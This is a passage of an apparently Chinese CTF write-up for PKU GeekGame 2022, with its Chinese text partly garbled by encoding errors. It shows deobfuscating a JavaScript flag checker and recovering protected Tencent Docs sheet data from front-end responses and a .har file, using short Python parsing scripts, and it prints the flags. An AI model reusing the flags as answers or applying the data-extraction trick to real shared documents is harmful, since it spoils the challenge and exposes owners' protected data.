<span class="token comment"># function checkflag2(_0xa83ex2){var _0x724b=['charCodeAt','map','','split','stringify','Correct','Wrong','j-'];return (JSON[_0x724b[4]](_0xa83ex2[_0x724b[3]](_0x724b[2])[_0x724b[1]](function(_0xa83ex3){return _0xa83ex3[_0x724b[0]](0)}))== JSON[_0x724b[4]]([0,15,16,17,30,105,16,31,16,67,3,33,5,60,4,106,6,41,0,1,67,3,16,4,6,33,232][_0x724b[1]](function(_0xa83ex3){return (checkflag2+ _0x724b[2])[_0x724b[0]](_0xa83ex3)}))?_0x724b[5]:_0x724b[6])}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç¨å¾®ä¿®å¤ä¸€ä¸‹ï¼Œæ‰‹åŠ¨è§£æ··æ·†å°±è¡Œäº†</p>
<p><code>checkflag2+ _0x724b[2]</code> å…¶å®å°±æ˜¯å°†å‡½æ•°æœ¬èº«ç»™è½¬åŒ–ä¸ºå­—ç¬¦ä¸²</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">checkflag2</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// var _0x724b = ['charCodeAt', 'map', '', 'split', 'stringify', 'Correct', 'Wrong', 'j-'];</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">[</span><span class="token string">'stringify'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">'split'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'map'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> x<span class="token punctuation">[</span><span class="token string">'charCodeAt'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">JSON</span><span class="token punctuation">[</span><span class="token string">'stringify'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">232</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'map'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string">"function checkflag2(_0xa83ex2){var _0x724b=['charCodeAt','map','','split','stringify','Correct','Wrong','j-'];return (JSON[_0x724b[4]](_0xa83ex2[_0x724b[3]](_0x724b[2])[_0x724b[1]](function(_0xa83ex3){return _0xa83ex3[_0x724b[0]](0)}))== JSON[_0x724b[4]]([0,15,16,17,30,105,16,31,16,67,3,33,5,60,4,106,6,41,0,1,67,3,16,4,6,33,232][_0x724b[1]](function(_0xa83ex3){return (checkflag2+ _0x724b[2])[_0x724b[0]](_0xa83ex3)}))?_0x724b[5]:_0x724b[6])}"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'charCodeAt'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">'Correct'</span> <span class="token operator">:</span> <span class="token string">'Wrong'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">// JSON['stringify'](...)</span>
<span class="token comment">// '[102,108,97,103,123,106,97,118,97,115,99,114,105,112,116,45,111,98,102,117,115,99,97,116,111,114,125]'</span>
<span class="token comment">// flag{javascript-obfuscator}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ä¼é¹…æ–‡æ¡£"><a href="#ä¼é¹…æ–‡æ¡£" class="headerlink" title="ä¼é¹…æ–‡æ¡£"></a>ä¼é¹…æ–‡æ¡£</h3><blockquote>
<blockquote>
<p>åœ¨ä¸€ä¸ªå¼€æºè½¯ä»¶å­¦æœ¯å¤§ä¼šä¸Šï¼Œä¸»æŒäººçªç„¶è¯´ï¼šä¸‹é¢è¯·è®¤ä¸ºæ— ä»£ç å¼€å‘ä¼šå‡å°‘å®‰å…¨æ¼æ´çš„åŒå¿—ååˆ°ä¼šåœºå·¦è¾¹ï¼Œè®¤ä¸ºæ— ä»£ç å¼€å‘ä¼šå¢åŠ å®‰å…¨æ¼æ´çš„åŒå¿—ååˆ°ä¼šåœºå³è¾¹ã€‚</p>
<p>å¤§éƒ¨åˆ†äººååˆ°äº†å·¦è¾¹ï¼Œå°‘æ•°äººååˆ°å³è¾¹ï¼Œåªæœ‰ You é…±è¿˜ååœ¨ä¸­é—´ä¸åŠ¨ã€‚</p>
<p>ä¸»æŒäººï¼šä¾‘åŒå¿—ï¼Œä½ åˆ°åº•è®¤ä¸ºæ— ä»£ç å¼€å‘ä¼šå‡å°‘è¿˜æ˜¯å¢åŠ æ¼æ´ï¼Ÿ</p>
<p>å›ç­”ï¼šæˆ‘è®¤ä¸ºæ— ä»£ç å¼€å‘ä¼šå‡å°‘åŸæ¥å­˜åœ¨çš„æ¼æ´ï¼Œä½†æ˜¯ä¼šå¸¦æ¥å¾ˆå¤šæ–°çš„æ¼æ´ã€‚</p>
<p>ä¸»æŒäººæ…Œå¿™è¯´ï¼šé‚£è¯·æ‚¨èµ¶å¿«ååˆ°ä¸»å¸­å°ä¸Šæ¥ã€‚</p>
</blockquote>
<p>ä¼é¹…æ–‡æ¡£ç›¸ä¿¡å¤§å®¶éƒ½å¾ˆç†Ÿæ‚‰ï¼Œå®ƒæ˜¯ä¼é¹…å…¬å¸ä¹…è´Ÿç››åçš„åœ¨çº¿æ–‡æ¡£ç¼–è¾‘å¹³å°ã€‚ä½†æ˜¯åŸºäºä¼é¹…æ–‡æ¡£çš„æ— ä»£ç  OA ç³»ç»Ÿæ˜¯æ€ä¹ˆå›äº‹å‘¢ï¼Ÿä¸‹é¢å°±è®©å°ç¼–å¸¦å¤§å®¶ä¸€èµ·äº†è§£å§ã€‚</p>
<p>åŸºäºä¼é¹…æ–‡æ¡£çš„æ— ä»£ç  OA ç³»ç»Ÿï¼Œå…¶å®å°±æ˜¯ç”¨ä¼é¹…æ–‡æ¡£æ¥å®ç° OA ç³»ç»Ÿã€‚å¾ˆå¤šä¼ä¸šã€å­¦æ ¡ã€ç»„ç»‡ä¹‹å‰ä½¿ç”¨ OA ç³»ç»Ÿæ¥ä¸‹å‘é€šçŸ¥å’Œå¡«æŠ¥æŠ¥è¡¨ï¼Œç°åœ¨è¿™äº›æœºæ„å¾ˆå¤šéƒ½è½¬å‘äº†ä½¿ç”¨ä¼é¹…æ–‡æ¡£æ¥ä¸‹å‘é€šçŸ¥å’Œå¡«æŠ¥æŠ¥è¡¨ï¼Œå½“ç„¶å¯ä»¥é€‰æ‹©é—®å·æ˜Ÿè¿™äº›ç±»ä¼¼çš„æœåŠ¡ã€‚</p>
<p>å¤§å®¶å¯èƒ½ä¼šæ„Ÿåˆ°æƒŠè®¶ï¼Œç”¨ä¼é¹…æ–‡æ¡£æ¥å¡«æŠ¥æŠ¥è¡¨ä¸ä¼šå‡ºç°å®‰å…¨å’Œéšç§é—®é¢˜å—ï¼Ÿä½†äº‹å®å°±æ˜¯è¿™æ ·ï¼Œå°ç¼–ä¹Ÿæ„Ÿåˆ°éå¸¸æƒŠè®¶ã€‚</p>
<p>é‚£ä¹ˆè¿™å°±æ˜¯åŸºäºä¼é¹…æ–‡æ¡£çš„æ— ä»£ç  OA ç³»ç»Ÿäº†ï¼Œå¤§å®¶æœ‰æ²¡æœ‰è§‰å¾—å¾ˆç¥å¥‡å‘¢ï¼Ÿå¿«å¿«ç‚¹å‡»å·¦ä¸‹è§’çš„é˜…è¯»åŸæ–‡æ¥çœ‹çœ‹åŸºäºä¼é¹…æ–‡æ¡£çš„æ— ä»£ç  OA ç³»ç»Ÿå§ã€‚</p>
<p> ä½ å¯ä»¥ <a target="_blank" rel="noopener" href="https://docs.qq.com/sheet/DV1lsUFRhQlp5eWtq?tab=BB08J2">è®¿é—®ä¼é¹…æ–‡æ¡£</a></p>
</blockquote>
<p>è¯´åˆ° æ— ä»£ç å¹³å°ï¼Œ<del>å°±æƒ³åˆ°ä½ æ ¡ç”¨é‚£ä¸ª sb æ— ä»£ç å¹³å°äº†ï¼Œç®—äº†ä¸è¯´äº†ä¿¡æ¯æ—©éƒ½æ¼å®Œäº†</del>â€˜</p>
<p>ç›´æ¥è¿™é‡Œçœ‹ä¸åˆ°ä¹Ÿå¤åˆ¶ä¸äº†ï¼Œè®¾ä¸ºä¿æŠ¤èŒƒå›´äº†</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122034126547.png"></p>
<p>ä½†æ˜¯å§è¿™æ˜¯ä¸ªæ–‡æ¡£ï¼Œä¸œè¥¿è‚¯å®šéƒ½è¿”å›å‰ç«¯äº†çš„ï¼Œæœä¸€ä¸‹å°±è¡Œäº†</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122033712825.png"></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122033740399.png"></p>
<p><strong>exp:</strong></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> json

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.json'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    s <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

r <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    r <span class="token operator">+=</span> s<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"2"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>
<span class="token comment"># é€šè¿‡ä»¥ä¸‹é“¾æ¥è®¿é—®é¢˜ç›®æœºå¯†flagï¼šhttps://geekgame.pku.edu.cn/service/template/prob_kAiQcWHobs</span>

<span class="token comment"># ç¬¬äºŒä¸ªè¯·æ±‚</span>
<span class="token comment"># BzRJEs_next</span>
<span class="token comment"># https://geekgame.pku.edu.cn/service/template/prob_kAiQcWHobsBzRJEs_next</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å±…ç„¶æ˜¯å¥—å¨ƒé¢˜ï¼</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122034419316.png"></p>
<p>é™„ä»¶ç»™äº†ä¸ªæµè§ˆå™¨ Network å¯¼å‡ºçš„ .har æ–‡ä»¶ï¼Œé‚£å°±æ‰“å¼€ç›´æ¥æœ </p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122034949816.png"></p>
<p>flag ç›¸å…³çš„é•¿è¿™æ ·</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token property">"2"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"Below is your flag"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"24"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"25"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"26"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"34"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"35"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"37"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"38"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"45"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"46"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"55"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"56"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"57"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"58"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"67"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"68"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"78"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"79"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"88"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"89"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"90"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"91"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"111"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"112"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"113"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"123"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"124"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"134"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"135"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"145"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"146"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"156"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"157"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"167"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"168"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"177"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"178"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"179"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"180"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"199"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"200"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"201"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"202"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"213"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"214"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"221"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment">//...</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>å‘ç°è¿™ä¸ªä¸€è¡Œä» A-&gt;K æ˜¯0åˆ°10ï¼Œæ­£å¥½ 24 å°±æ˜¯ç¬¬ä¸€ä¸ªçº¯é»‘å—çš„åœ°æ–¹ï¼Œäºæ˜¯å†™ä¸ªè„šæœ¬ç”»ä¸ªå›¾ï¼Œç»™è¿™äº›ç‚¹ä¸Šè‰²å°±å¥½äº†</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122040624839.png"></p>
<p>exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
<span class="token keyword">import</span> json

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.json'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    s <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>
    l<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># print(l)</span>

<span class="token comment"># 2563/11=233.0</span>
img <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">234</span><span class="token punctuation">)</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">:</span>
    img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">11</span><span class="token punctuation">,</span> i<span class="token operator">//</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
img<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
img<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'flag.png'</span><span class="token punctuation">)</span>

<span class="token comment"># flag{ThisIsNotSponsoredByTencent}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

